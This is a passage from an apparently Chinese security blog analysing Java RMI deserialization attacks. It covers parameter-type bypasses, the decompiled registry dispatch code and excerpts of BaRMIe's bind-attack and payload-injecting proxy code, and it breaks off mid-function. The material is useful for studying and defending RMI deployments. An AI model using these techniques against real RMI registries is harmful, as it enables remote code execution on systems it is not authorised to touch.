设置VM options
Server调试一下，断点下在入参判断处，然后客户端直接运行。
可以看到入参类型为String，但是var1中是Object类型的URLDNS payload
到URLDNS的触发末端下个断点看看`java.net.URLStreamHandler#hashCode`，已经执行到这了，证明OK。（其实是由于再写文章的时候CEYE莫名其妙挂了，就不补图惹，不了解URLDNS原理的可以看[这里](https://www.anquanke.com/post/id/201762#h3-7)）
其实我们回看[BaRMIe](https://github.com/NickstaDB/BaRMIe)，会发现在其README.md文档中已经对于该类型绕过进行了说明（可能这就是大佬吧.jpg）：
> 3.通过非法的方法调用进行反序列化攻击
>
>
> 由于在服务器上对于客户端传入参数序列化的同时对于方法的参数并没有进行匹配检查。我们可以使用具有非原始参数类型的任何方法作为反序列化攻击的入口点。BaRMIe通过使用TCP代理在网络级别修改方法参数来实现这一点，实际上触发了非法的方法调用。下面是一些易受攻击方法的示例：
>  
>  
>     public void setName(String name);
>     public Long add(Integer i1, Integer i2);
>     public void sum(int[] values);
>  
>
>
> 当方法调用通过代理时，这些方法的参数可以替换为反序列化负载。此攻击是可能的，因为Java在反序列化之前不会尝试验证通过网络接收的远程方法参数是否与实际参数类型兼容。
这里提到 **Integer参数** 也是可以利用的，但是想想不科学呀，Integer不是在if为true的情况下么？我们回看下
    if (var0.isPrimitive()) {
        if (var0 == Integer.TYPE) {//这里
            return var1.readInt();
            //...
查一下[isPrimitive()](http://www.51gjie.com/java/778.html)是判断是否为基本类，包括基本类型boolean、char、byte、short、int、long、float、double。而Integer是int的封装类，不是一个基本类，所以Interger的参数也可以？
试一试：
还真的会到else中......
这里有一个非常坑的烟雾弹，那就是下面的 **Integer.TYPE**
，真的会很自然的以为Integer.TYPE就是Integer类，那么包括integer类下面的这些类都不行，而实际上 **Integer.TYPE**
不是Integer类是基础类 **int** ！！！！！
那么我们也就可以理解为啥 **参数为Integer** 是可以的了，因为Integer !=i nt，不是基础类。
再顺手来验证下 **int[]** 吧
也进入else，数组的class竟然长这样 因垂丝汀。最后看一个不行的int类型：
> 这里截图是去掉替换成payload的jar包看到的结果，替换成payload后其实不到这里就会报错退出，没有细究应该是payload的问题。
那么至此我们也就知道： **假如服务端起一个RMI服务，只要提供了非基础类的参数接口，我们都可以对其进行反序列化攻击。**
在相关文章中总结的：
  * Bypass JEP290攻击rmi的 **即使暴露的函数非Object参数类型的，也是可以被攻击的。**
  * RMI漏洞的另一种利用方式的 **如果暴露的函数无Object类型参数，那么就需要动态替换rmi通讯时候函数参数的值**
感觉都会有些误导说让人迷糊的觉得所有参数都可以，可能是因为这个太简单了？？
回到Barmie工具，它虽然提出了这个绕过Object调用的利用方式，但是是没有为其提供攻击模块。
想想也正常，这个绕过其实在实际场景中也同样有一个鸡肋的前提，客户端要知道服务端起服务的接口以及调用方式，即a.b(c)。
实际利用还是太难了。
## RMI服务端反序列化攻击RMI注册端
上边讲述的三类攻击方式，讨论的人挺少，因为在实际中确实挺鸡肋的，但是搞搞清楚也算有趣。
接下来就是比较通用的攻击情景了：攻击者模拟RMI服务端攻击RMI注册端
我们先来看看RMI服务端的漏洞触发点代码：`/rt.jar!/sun/rmi/server/UnicastServerRef.class#RegistryImpl_Skel`
> 环境：RMI-Server ServerAndRegister 分析
>
> jdk:1.7u80
>
>
> jdk7u80版本这个地方在调试`RegistryImpl_Skel.class`这个神奇的文件的时候有一个非常有趣而坑爹的情况，那就是这个class压根没法调试。百思不得其解，去下了openjdk
> 的jdk源码，发现源码中根本没有这个`RegistryImpl_Skel.java`文件。
>
>
> 跟wh1tp1g讨论了下，应该是一个动态生成的class，所以不能调试。然后非常神奇在jdk8版本的8u112也不能调试，但是8u141之后又可以了。如果有想自己调试的同学可以注意下这个点。
`sun.rmi.registry.RegistryImpl_Skel#dispatch`（我们可以叫做RMI注册任务分发处，就是注册端处理请求的地方）其实是从`sun.rmi.server.UnicastServerRef#dispatch`（RMI请求分发处）那边过来的。
由于RegistryImpl_Skel不能下断点，我们在bind函数执行处`sun.rmi.registry.RegistryImpl#bind`下一个断点，直接运行，就可以得到调用栈，再回去找就好了。
`sun.rmi.registry.RegistryImpl_Skel#dispatch`：
    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
            //一处接口hash验证
            if (var4 != 4905912898345647071L) {
                throw new SkeletonMismatchException("interface hash mismatch");
            } else {
            //设定变量开始处理请求
                //var6为RegistryImpl对象，调用的就是这个对象的bind、list等方法
                RegistryImpl var6 = (RegistryImpl)var1;
                //接受客户端输入流的参数变量
                String var7;
                Remote var8;
                ObjectInput var10;
                ObjectInput var11;
                //var3表示对应的方法值0-4，这个数字是跟RMI客户端约定好的
                //比如RMI客户端发送bind请求：就是sun.rmi.registry.RegistryImpl_Stub#bind中的这一句
                //super.ref.newCall(this, operations, 0, 4905912898345647071L);
                switch(var3) {
                //统一删除了try等语句
                case 0:
                        //bind(String,Remote)分支
                        var11 = var2.getInputStream();
                        //1.反序列化触发处
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                        var6.bind(var7, var8);
                case 1:
                        //list()分支
                        var2.releaseInputStream();
                        String[] var97 = var6.list();
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                case 2:
                      //lookup(String)分支
                        var10 = var2.getInputStream();
                        //2.反序列化触发处
                        var7 = (String)var10.readObject();
                        var8 = var6.lookup(var7);
                case 3:
                      //rebind(String,Remote)分支
                        var11 = var2.getInputStream();
                        //3.反序列化触发处
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                        var6.rebind(var7, var8);
                case 4:
                        //unbind(String)分支
                        var10 = var2.getInputStream();
                        //4.反序列化触发处
                        var7 = (String)var10.readObject();
                        var6.unbind(var7);
                default:
                    throw new UnmarshalException("invalid method number");
                }
            }
        }
可以得到4个反序列化触发处： **lookup** 、 **unbind** 、 **rebind** 、 **bind** 。
#### RMI客户端角度的lookup攻击RMI注册端
>
> 其中lookup是以客户端的角度攻击，但是其原理与以服务端角度攻击的bind，rebind，unbind完全一致。我们会在最后的罗列中把lookup区分开，不再领出来细说。
>
> 此处建立一个小标题，作为提醒
这里可能会有一个疑问：  
**4个接口有两类参数，String和Remote类型的Object，那么是不是我们只能攻击必须要是Remote类型的Object接口呢？即实际上只有bind、rebind接口才是可以攻击的？**
之所以会产生这个疑问是由于 有些文章会说替换Remote类型的参数为payload 或者
我们看Ysoserial的payload的构造过程也是构造出一个Remote类型的payload
Object，再把正常的Remote参数替换为Remote类型的payload，这些都给我们一种只有Remote参数才能反序列化的假象
虽然我们看到RMI注册端的解析过程是直接反序列化传参，看样子String和Remote的参数位置都是可以的，但还是会摇摆不定。
但事实是 **RMI注册端没有任何校验，你的payload放在Remote参数位置可以攻击成功，放在String参数位置也可以攻击成功** 。  
而之所以Ysoserial生成payload要变成Remote格式，是因为RMI服务端发这个数据包的流程中会需要这个对象是Remote类型的，我们之后将证明，并且详细说明。
### Barmie - Bind
各个工具都对于服务端打注册端的bind攻击写了exploit，相对于上面攻击形式，bind攻击更具备通用性。
Barmie对于Bind接口有探测和攻击两个模块
简单总结一下探测模块：`nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#canAttackEndpoint`
  1. 新建一个RMI代理服务器，在这个代理服务器中会对输出的数据包进行重新构造
  2. 获取这个RMI对象，调用其bind方法
  3. 重构客户端输出的数据包，改变其内容为预设好的一个Object
  4. 服务端肯定会报错（由于我们预设的Object不会被正确解析执行），根据服务端返回报错栈，去匹配是否有`filter status: REJECTED`字符串来判断，对方的JDK版本我们是否可以攻击。（这个字符串是JEP290拦截导致的，之后我们会提到）
  5. 如果没有匹配到就说明可以攻击。
再来详细看看流程比较相似的攻击模块`nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#executeAttack`：
    public void executeAttack(RMIEndpoint ep, DeserPayload payload, String cmd) throws BaRMIeException {
        RMIBindExploitProxy proxy = null;//代理器
        Registry reg;
        //已删去try部分
        //1.初始化一个bind RMI注册端代理器
        //我们的payload从这里给入
        proxy = new RMIBindExploitProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), this._options, payload.getBytes(cmd, 0));
        proxy.startProxy();
        //2.从RMI注册端代理器获取一个注册端对象
        reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());
        //3.通过RMI注册端代理器调用bind，修改参数为给定的payload
        //reg.bind(随机字符串,一个接口需要的Remote接口)
        //但是经过注册端代理器之后，这里的参数会被改为：bind(PAYLOAD, null)，没错payload是String的位置
        reg.bind(this.generateRandomString(), new BaRMIeBindExploit());
    }
    private static class BaRMIeBindExploit implements Remote, Serializable {
    }
最后形成的调用是`bind(PAYLOAD, null)`  
看看具体实现`nb.barmie.net.proxy.thread.BindPayloadInjectingProxyThread#handleData`
    public ByteArrayOutputStream handleData(ByteArrayOutputStream data) {
            ByteArrayOutputStream out;
            int blockLen;
            byte[] dataBytes;
            //获取输入的长度
            dataBytes = data.toByteArray();
            //判断这个输入包是不是一个RMI调用包，如果是的话进行修改
            if(dataBytes.length > 7 && dataBytes[0] == (byte)0x50) {
                //调用包以 TC_BLOCKDATA 标签开头,获取它的标签长度
                blockLen = (int)(dataBytes[6] & 0xff);
                //自己构建一个新的字节流，以原来包的长度和TC_BLOCKDATA标签开头
                out = new ByteArrayOutputStream();
                out.write(dataBytes, 0, blockLen + 7);